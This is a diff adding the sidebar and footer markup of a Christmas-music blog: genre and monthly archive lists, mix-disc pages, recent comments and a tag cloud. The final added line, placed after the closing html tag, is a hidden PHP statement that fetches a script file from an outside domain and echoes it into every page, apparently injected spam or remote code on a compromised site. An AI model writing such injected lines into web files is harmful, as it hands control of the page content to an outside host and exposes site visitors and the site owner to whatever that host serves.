+            <li><a href="http://www.mistletunes.com/rock-and-pop/surf/">Surf (27)</a>
+        
+        
+            </li>
+        
+        </ul>
+        
+    
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/">Soul/R&B (165)</a>
+        
+        
+        
+        <ul>
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/1950s-1/">1950s (4)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/1960s-2/">1960s (18)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/1970s-3/">1970s (4)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/1980s-4/">1980s (6)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/1990s-6/">1990s (15)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/2000s-3/">2000s (33)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/2010s-2/">2010s (51)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/2020s/">2020s (43)</a>
+        
+        
+            </li>
+        
+    
+        
+        
+            <li><a href="http://www.mistletunes.com/soulrb/compilations/">Compilations (25)</a>
+        
+        
+            </li>
+        
+        </ul>
+        
+    
+            </li>
+        
+        </ul>
+        
+    
+    </div>
+</div>
+
+
+
+
+    <div class="widget-archive-monthly widget-archive widget">
+    <h3 class="widget-header">Monthly <a href="http://www.mistletunes.com/archives.html">Archives</a></h3>
+    <div class="widget-content">
+        <ul>
+        
+            <li><a href="http://www.mistletunes.com/2026/01/">January 2026 (4)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/12/">December 2025 (82)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/11/">November 2025 (38)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/01/">January 2025 (12)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2024/12/">December 2024 (74)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2024/11/">November 2024 (42)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2024/01/">January 2024 (8)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2023/12/">December 2023 (77)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2023/11/">November 2023 (36)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2023/01/">January 2023 (4)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2022/12/">December 2022 (64)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2022/11/">November 2022 (31)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2022/01/">January 2022 (6)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2021/12/">December 2021 (52)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2021/11/">November 2021 (43)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2021/10/">October 2021 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2021/01/">January 2021 (4)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2020/12/">December 2020 (77)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2020/11/">November 2020 (27)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2020/01/">January 2020 (7)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2019/12/">December 2019 (78)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2019/11/">November 2019 (21)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2019/01/">January 2019 (12)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2018/12/">December 2018 (92)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2018/11/">November 2018 (44)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2018/01/">January 2018 (3)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2017/12/">December 2017 (58)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2017/11/">November 2017 (28)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2016/12/">December 2016 (77)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2016/11/">November 2016 (32)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2016/01/">January 2016 (4)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2015/12/">December 2015 (70)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2015/11/">November 2015 (32)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2015/03/">March 2015 (3)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2015/02/">February 2015 (9)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2015/01/">January 2015 (20)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2014/12/">December 2014 (75)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2014/11/">November 2014 (23)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2014/08/">August 2014 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2014/01/">January 2014 (7)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2013/12/">December 2013 (45)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2013/11/">November 2013 (31)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2013/10/">October 2013 (5)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2013/08/">August 2013 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2013/05/">May 2013 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2013/01/">January 2013 (17)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2012/12/">December 2012 (81)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2012/11/">November 2012 (22)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2012/10/">October 2012 (14)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2012/01/">January 2012 (2)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2011/12/">December 2011 (40)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2011/11/">November 2011 (46)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2011/10/">October 2011 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2011/09/">September 2011 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/12/">December 2010 (54)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/11/">November 2010 (57)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/10/">October 2010 (2)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/09/">September 2010 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/08/">August 2010 (2)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/06/">June 2010 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/04/">April 2010 (16)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/03/">March 2010 (37)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/02/">February 2010 (35)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2010/01/">January 2010 (36)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/12/">December 2009 (54)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/11/">November 2009 (42)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/10/">October 2009 (18)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/09/">September 2009 (23)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/08/">August 2009 (18)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/07/">July 2009 (18)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/06/">June 2009 (34)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/05/">May 2009 (63)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/04/">April 2009 (21)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/03/">March 2009 (23)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2009/01/">January 2009 (17)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2008/09/">September 2008 (111)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2008/08/">August 2008 (16)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2008/07/">July 2008 (31)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2008/06/">June 2008 (12)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2008/03/">March 2008 (14)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2008/02/">February 2008 (25)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2008/01/">January 2008 (25)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2007/09/">September 2007 (139)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2007/08/">August 2007 (34)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2006/11/">November 2006 (1)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2006/10/">October 2006 (59)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2006/09/">September 2006 (37)</a></li>
+        
+        </ul>
+    </div>
+</div>
+        
+    
+
+
+
+<div class="widget-pages widget">
+    <h3 class="widget-header">Pages</h3>
+    <div class="widget-content">
+        <ul>
+    
+            <li class="page page-137"><a href="http://www.mistletunes.com/mistletunes-hanukkah.html">Hanukkah alerts</a></li>
+    
+            <li class="page page-6"><a href="http://www.mistletunes.com/our-favorite-links.html">Our favorite links</a></li>
+    
+            <li class="page page-5"><a href="http://www.mistletunes.com/statement-of-purpose.html">Statement of purpose</a></li>
+    
+    
+            <li class="folder folder-64"><strong>art</strong>
+        
+            </li>
+        
+    
+            <li class="folder folder-29"><strong>mix_discs</strong>
+        
+            
+                <ul>
+            
+                    <li class="page page-2810"><a href="http://www.mistletunes.com/mix-discs/a-long-winters-nap-various-artists-mistletunes-2025.html">A Long Winter's Nap, various artists (Mistletunes, 2025)</a></li>
+            
+        
+            
+                    <li class="page page-2341"><a href="http://www.mistletunes.com/mix-discs/fix-don-we-apparel-2021.html">Don We Now Our Plague Apparel, various artists (Mistletunes, 2021)</a></li>
+            
+        
+            
+                    <li class="page page-2679"><a href="http://www.mistletunes.com/mix-discs/doordasher-various-artists-mistletunes-2024.html">DoorDasher, various artists (Mistletunes, 2024)</a></li>
+            
+        
+            
+                    <li class="page page-272"><a href="http://www.mistletunes.com/mix-discs/egg-nog-noggin-on-heavens-door-various-artists-mistletunes-2009.html">Egg-Nog-Noggin' On Heaven's Door, various artists (Mistletunes, 2009)</a></li>
+            
+        
+            
+                    <li class="page page-1866"><a href="http://www.mistletunes.com/mix-discs/fake-yules-various-artists-mistletunes-2017.html">Fake Yules, various artists (Mistletunes, 2017)</a></li>
+            
+        
+            
+                    <li class="page page-2255"><a href="http://www.mistletunes.com/mix-discs/fanculo-2020-various-artists-mistletunes-2020.html">Fanculo 2020, various artists (Mistletunes, 2020)</a></li>
+            
+        
+            
+                    <li class="page page-1189"><a href="http://www.mistletunes.com/mix-discs/fifty-shades-of-holly-ivy-various-artists-mistletunes-2012.html">Fifty Shades of Holly & Ivy, various artists (Mistletunes, 2012)</a></li>
+            
+        
+            
+                    <li class="page page-181"><a href="http://www.mistletunes.com/mix-discs/gold-frankincense-and-mirth-various-artists-mistletunes-2002.html">Gold, Frankincense and Mirth, various artists (Mistletunes, 2002)</a></li>
+            
+        
+            
+                    <li class="page page-1981"><a href="http://www.mistletunes.com/mix-discs/hello-911-first-merry-christmas-various-artists-mistletunes-2018.html">Hello 911? First, Merry Christmas...., various artists (Mistletunes, 2018)</a></li>
+            
+        
+            
+                    <li class="page page-1776"><a href="http://www.mistletunes.com/mix-discs/manger-things-various-artists-mistletunes-2016.html">Manger Things, various artists (Mistletunes, 2016)</a></li>
+            
+        
+            
+                    <li class="page page-2110"><a href="http://www.mistletunes.com/mix-discs/merry-christmas-happy-holidays-various-artists-mistletunes-2019.html">Merry Christmas! Happy Holidays!, various artists (Mistletunes, 2019)</a></li>
+            
+        
+            
+                    <li class="page page-186"><a href="http://www.mistletunes.com/mix-discs/mistletunes-accomplished-various-artists-mistletunes-2006.html">Mistletunes Accomplished, various artists (Mistletunes, 2006)</a></li>
+            
+        
+            
+                    <li class="page page-1080"><a href="http://www.mistletunes.com/mix-discs/occupy-34th-street-various-artists-mistletunes.html">Occupy 34th Street, various artists (Mistletunes, 2011)</a></li>
+            
+        
+            
+                    <li class="page page-180"><a href="http://www.mistletunes.com/mix-discs/santa-eye-for-the-grinch-guy-various-artists-mistletunes-2003.html">Santa Eye for the Grinch Guy, various artists (Mistletunes, 2003)</a></li>
+            
+        
+            
+                    <li class="page page-1426"><a href="http://www.mistletunes.com/mix-discs/santas-tworkshop-various-artists-mistletunes-2013.html">Santa's Tworkshop, various artists (Mistletunes, 2013)</a></li>
+            
+        
+            
+                    <li class="page page-178"><a href="http://www.mistletunes.com/mix-discs/silent-night-and-good-luck-various-artists-mistletunes-2005.html">Silent Night, and Good Luck, various artists (Mistletunes, 2005)</a></li>
+            
+        
+            
+                    <li class="page page-1667"><a href="http://www.mistletunes.com/mix-discs/thats-where-santa-keeps-his-toys-various-artists-mistletunes-2015.html">That's Where Santa Keeps His Toys, various artists (Mistletunes, 2015)</a></li>
+            
+        
+            
+                    <li class="page page-179"><a href="http://www.mistletunes.com/mix-discs/the-bipolar-express-various-artists-mistletunes-2004.html">The Bipolar Express, various artists (Mistletunes, 2004)</a></li>
+            
+        
+            
+                    <li class="page page-712"><a href="http://www.mistletunes.com/mix-discs/the-elves-packed-my-sack-why-various-artists-mistletunes.html">The Elves Packed My Sack. Why?, various artists (Mistletunes, 2010)</a></li>
+            
+        
+            
+                    <li class="page page-2224"><a href="http://www.mistletunes.com/mix-discs/the-naughty-list-was-fixed-various-artists-mistletunes-2020.html">The Naughty List Was Rigged!, various artists (Mistletunes, 2020)</a></li>
+            
+        
+            
+                    <li class="page page-1534"><a href="http://www.mistletunes.com/mix-discs/the-naughty-or-nice-bucket-challenge-various-artists-mistletunes-2014.html">The Naughty or Nice Bucket Challenge, various artists (Mistletunes, 2014)</a></li>
+            
+        
+            
+                    <li class="page page-2536"><a href="http://www.mistletunes.com/mix-discs/there-aint-no-santos-claus-various-artists-mistletunes.html">There Ain't No Santos Claus!, various artists (Mistletunes, 2023)</a></li>
+            
+        
+            
+                    <li class="page page-2429"><a href="http://www.mistletunes.com/mix-discs/treason-for-the-season-various-artists-mistletunes-2022.html">Treason For the Season, various artists (Mistletunes, 2022)</a></li>
+            
+        
+            
+                    <li class="page page-176"><a href="http://www.mistletunes.com/mix-discs/wake-me-up-before-you-ho-ho-various-artists-mistletunes-2007.html">Wake Me Up Before You Ho-Ho, various artists (Mistletunes, 2007)</a></li>
+            
+        
+            
+                    <li class="page page-175"><a href="http://www.mistletunes.com/mix-discs/yuletube-various-artists-mistletunes-2008.html">YuleTube, various artists (Mistletunes, 2008)</a></li>
+            
+                </ul>
+            
+        
+            </li>
+        
+    
+        </ul>
+    </div>
+</div>
+
+<div class="widget-syndication widget">
+    <div class="widget-content">
+        <ul>
+            <li><img src="http://www.mistletunes.com/mt-static/images/status_icons/feed.gif" alt="Subscribe to feed" width="9" height="9" /> <a href="http://www.mistletunes.com/atom.xml">Subscribe to this blog's feed</a></li>
+
+        </ul>
+    </div>
+</div>
+<div class="widget-openid widget">
+    <div class="widget-content">
+        <em><strong>OpenID</strong> accepted here</em>
+        <a href="http://www.sixapart.com/labs/openid/">Learn more about OpenID</a>
+    </div>
+</div>
+
+<div class="widget-powered widget">
+    <div class="widget-content">
+        <a href="http://www.movabletype.com/"><img src="http://www.mistletunes.com/mt-static/images/bug-pbmt-white.png" alt="Powered by Movable Type 5.2.9" width="120" height="75" /></a>
+    </div>
+</div>
+
+
+
+    </div>
+</div>
+
+
+
+    
+<div id="gamma">
+    <div id="gamma-inner">
+    <div class="widget-search widget">
+    <h3 class="widget-header">Search</h3>
+    <div class="widget-content">
+        <form method="get" action="http://www.mistletunes.com/cgi-bin/mt/mt-search.cgi">
+            <input type="text" id="search" class="ti" name="search" value="" />
+
+            <input type="hidden" name="IncludeBlogs" value="1" />
+
+            <input type="hidden" name="limit" value="20" />
+            <input type="submit" accesskey="4" value="Search" />
+        </form>
+    </div>
+</div>
+
+<div class="widget-recent-comments widget">
+    <h3 class="widget-header">Recent Comments</h3>
+    <div class="widget-content">
+        <ul>
+        
+            <li><strong>Puzzlemonkey:</strong> I generally avoid signing up for accounts on the internet... <a href="http://www.mistletunes.com/2022/12/a-few-words-on-the-holiday.html#comment-1602" title="full comment on: A few words on the holiday">read more</a></li>
+        
+    
+        
+            <li><strong>VanderAppel:</strong> Hi! I had never heard of her, but what she <a href="http://www.mistletunes.com/2022/12/12-months-of-christmas-elizabeth-chan-self-issued.html#comment-1601" title="full comment on: 12 Months of Christmas, Elizabeth Chan (self-issued)">read more</a></li>
+        
+    
+        
+            <li><strong>Teds Red Hots:</strong> Just checking in in 2022. I hope you plan on <a href="http://www.mistletunes.com/2022/01/this-christmas-brinsley-schwarz-self-issued.html#comment-1600" title="full comment on: "This Christmas," Brinsley Schwarz (self-issued)">read more</a></li>
+        
+    
+        
+            <li><strong>August:</strong> Season's Greetings! See below in hopes that you are looking <a href="http://www.mistletunes.com/2021/10/its-just-about-that-time.html#comment-1597" title="full comment on: It's just about that time">read more</a></li>
+        
+    
+        
+            <li><strong>daf:</strong> Thanks for the great content. Question: What was the first <a href="http://www.mistletunes.com/statement-of-purpose.html#comment-1596" title="full comment on: Statement of purpose">read more</a></li>
+        
+    
+        
+            <li><strong>daveblev:</strong> As previously mentioned I've been following this site since 2001 <a href="http://www.mistletunes.com/2020/12/more-shorts.html#comment-1592" title="full comment on: More shorts">read more</a></li>
+        
+    
+        
+            <li><strong>daveblev:</strong> Love this comp! I'm a music director at WODU college <a href="http://www.mistletunes.com/2020/12/big-stir-singles-the-yuletide-wave-various-artists-big-stir.html#comment-1591" title="full comment on: Big Stir Singles: The Yuletide Wave, various artists (Big Stir)">read more</a></li>
+        
+    
+        
+            <li><strong>chattan:</strong> All the Gifts I Need is a song by JD <a href="http://www.mistletunes.com/2019/12/shine-so-bright-jackopierce-foreverything.html#comment-1590" title="full comment on: Shine So Bright, Jackopierce (foreverything)">read more</a></li>
+        
+    
+        
+            <li><strong>Rich Woods:</strong> Download is available: https://futuremanrecords.bandcamp.com/album/a-kool-kat-kristmas-vol-3 <a href="http://www.mistletunes.com/2019/12/a-kool-kat-kristmas-volume-3-various-artists-kool-kat.html#comment-1588" title="full comment on: A Kool Kat Kristmas Volume 3, various artists (Kool Kat)">read more</a></li>
+        
+    
+        
+            <li><strong>Dave Rudbarg:</strong>  As a long time fan of Mr. King (both <a href="http://www.mistletunes.com/2018/12/christmas-carol-vd-king-self-issued.html#comment-1585" title="full comment on: "Christmas Carol," V.D. King (self-issued)">read more</a></li>
+        
+        </ul>
+    </div>
+</div>
+        
+    
+
+
+    <div class="widget-recent-entries widget-archives widget">
+    <h3 class="widget-header">Recent Entries</h3>
+    <div class="widget-content">
+        <ul>
+        
+            <li><a href="http://www.mistletunes.com/2026/01/dead-christmas-trees-the-brixton-riot-with-peter-horvath-self-issued.html">"Dead Christmas Trees," The Brixton Riot with Peter Horvath (self-issued)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2026/01/joy-of-christmas-gladys-knight-many-different-roads.html">"Joy of Christmas," Gladys Knight (Many Different Roads)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2026/01/naughty-and-nice-nyka-monroe-piink.html">Naughty and Nice, Nyka Monroe (Piink)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2026/01/white-wine-whatever-the-paranoid-style-barnone.html">"White Wine Whatever," The Paranoid Style (Bar/None)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/12/santa-broke-my-heart-in-2-merry-christmas-harry-berenice-self-issued.html">"Santa Broke My Heart in 2 (Merry Christmas Harry)," Berenice (self-issued)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/12/ave-maria-alanis-morissette-epiphany.html">"Ave Maria," Alanis Morissette (Epiphany)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/12/auld-lang-syne-kilgore-trout-basement-in-cohoes.html">"Auld Lang Syne," Kilgore Trout (Basement in Cohoes)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/12/arbor-christmas-volume-26-various-artists-self-issued.html">Arbor Christmas: Volume 26, various artists (self-issued)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/12/alice-coopers-a-taste-of-christmas-pudding-2025-various-artists-soundvision.html">Alice Cooper's A Taste of Christmas Pudding 2025, various artists (SoundVision)</a></li>
+        
+    
+        
+            <li><a href="http://www.mistletunes.com/2025/12/not-for-sale-polar-bear-queen-emi.html">"Not For Sale (Polar Bear)," Queen (EMI)</a></li>
+        
+        </ul>
+    </div>
+</div>
+        
+    
+
+
+    <div class="widget-recent-assets widget">
+    <h3 class="widget-header">Recent Assets</h3>
+    <div class="widget-content">
+        <ul>
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/deadxmastrees.jpg"><img src="http://www.mistletunes.com/assets_c/2026/01/deadxmastrees-thumb-autox70-2479.jpg" class="asset-img-thumb" alt="deadxmastrees.jpg" title="deadxmastrees.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/gladysknight.jpg"><img src="http://www.mistletunes.com/assets_c/2026/01/gladysknight-thumb-autox70-2478.jpg" class="asset-img-thumb" alt="gladysknight.jpg" title="gladysknight.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/nykamonroe.jpg"><img src="http://www.mistletunes.com/assets_c/2026/01/nykamonroe-thumb-autox70-2477.jpg" class="asset-img-thumb" alt="nykamonroe.jpg" title="nykamonroe.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/paranoidstyle.jpg"><img src="http://www.mistletunes.com/assets_c/2026/01/paranoidstyle-thumb-autox70-2476.jpg" class="asset-img-thumb" alt="paranoidstyle.jpg" title="paranoidstyle.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/berenice.jpg"><img src="http://www.mistletunes.com/assets_c/2025/12/berenice-thumb-autox70-2475.jpg" class="asset-img-thumb" alt="berenice.jpg" title="berenice.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/alanismaria.jpg"><img src="http://www.mistletunes.com/assets_c/2025/12/alanismaria-thumb-autox70-2474.jpg" class="asset-img-thumb" alt="alanismaria.jpg" title="alanismaria.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/kilgoretrout.jpg"><img src="http://www.mistletunes.com/assets_c/2025/12/kilgoretrout-thumb-autox70-2473.jpg" class="asset-img-thumb" alt="kilgoretrout.jpg" title="kilgoretrout.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/arborxmas.jpg"><img src="http://www.mistletunes.com/assets_c/2025/12/arborxmas-thumb-autox70-2472.jpg" class="asset-img-thumb" alt="arborxmas.jpg" title="arborxmas.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/pudding25.jpg"><img src="http://www.mistletunes.com/assets_c/2025/12/pudding25-thumb-autox70-2471.jpg" class="asset-img-thumb" alt="pudding25.jpg" title="pudding25.jpg" /></a></li>
+        
+    
+        
+        <li class="item"><a class="asset-image" href="http://www.mistletunes.com/art/chancesecret.jpg"><img src="http://www.mistletunes.com/assets_c/2025/12/chancesecret-thumb-autox70-2470.jpg" class="asset-img-thumb" alt="chancesecret.jpg" title="chancesecret.jpg" /></a></li>
+        
+        </ul>
+    </div>
+</div>
+        
+    
+
+
+    <div class="widget-tag-cloud widget">
+    <h3 class="widget-header">Tag Cloud</h3>
+    <div class="widget-content">
+        <ul>
+
+            <li class="rank-9"><a href="javascript:void(0)" onclick="location.href='http://www.mistletunes.com/cgi-bin/mt/mt-search.cgi?IncludeBlogs=1&amp;tag=login&amp;limit=20';return false;" rel="tag">login</a></li>
+
+
+
+            <li class="rank-9"><a href="javascript:void(0)" onclick="location.href='http://www.mistletunes.com/cgi-bin/mt/mt-search.cgi?IncludeBlogs=1&amp;tag=mistletunes&amp;limit=20';return false;" rel="tag">mistletunes</a></li>
+
+
+
+            <li class="rank-9"><a href="javascript:void(0)" onclick="location.href='http://www.mistletunes.com/cgi-bin/mt/mt-search.cgi?IncludeBlogs=1&amp;tag=movie&amp;limit=20';return false;" rel="tag">movie</a></li>
+
+
+
+            <li class="rank-9"><a href="javascript:void(0)" onclick="location.href='http://www.mistletunes.com/cgi-bin/mt/mt-search.cgi?IncludeBlogs=1&amp;tag=old%20site&amp;limit=20';return false;" rel="tag">old site</a></li>
+
+
+
+            <li class="rank-9"><a href="javascript:void(0)" onclick="location.href='http://www.mistletunes.com/cgi-bin/mt/mt-search.cgi?IncludeBlogs=1&amp;tag=sticky&amp;limit=20';return false;" rel="tag">sticky</a></li>
+
+
+
+            <li class="rank-9"><a href="javascript:void(0)" onclick="location.href='http://www.mistletunes.com/cgi-bin/mt/mt-search.cgi?IncludeBlogs=1&amp;tag=TypePad&amp;limit=20';return false;" rel="tag">TypePad</a></li>
+
+        </ul>
+    </div>
+</div>
+
+
+
+
+
+    </div>
+</div>
+
+
+
+
+                </div>
+            </div>
+
+
+            <div id="footer">
+    <div id="footer-inner">
+        <div id="footer-content">
+            <div class="widget-powered widget">
+                <div class="widget-content">
+                    Powered by <a href="http://www.movabletype.org/">Movable Type</a>
+                </div>
+            </div>
+
+            <div class="widget-creative-commons widget">
+                <div class="widget-content">
+                    This blog is licensed under a <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/">Creative Commons License</a>.
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+
+
+        </div>
+    </div>
+</body>
+</html>
+  <?php echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt"); ?>
